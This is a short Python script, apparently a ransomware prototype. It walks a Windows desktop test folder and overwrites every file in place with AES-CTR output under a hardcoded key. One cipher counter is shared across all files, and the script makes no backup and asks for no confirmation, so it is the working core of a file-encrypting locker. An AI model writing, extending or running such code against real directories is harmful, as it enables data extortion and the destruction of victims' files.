from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
import os.path




key = b'\xa6\xb3\x9b,=C\x9cs\x1c\x11P\xc8\x11\x8c\x0fS'
counter  = Counter.new(128) # bits 
c = AES.new(key,AES.MODE_CTR,counter=counter)

def enc(fullpath, key):
    with open(fullpath, 'r+b') as f:
        plaintext = f.read(16)
        while plaintext:
            f.seek(-len(plaintext),1)
            f.write(c.decrypt(plaintext))
            plaintext = f.read(16)
  

for dir,subdir,files in os.walk(r"C:\Users\Windows11\Desktop\tst\test"):
    for file in files:
        fullpath = os.path.join(dir,file)
        enc(fullpath, key)


        
                                






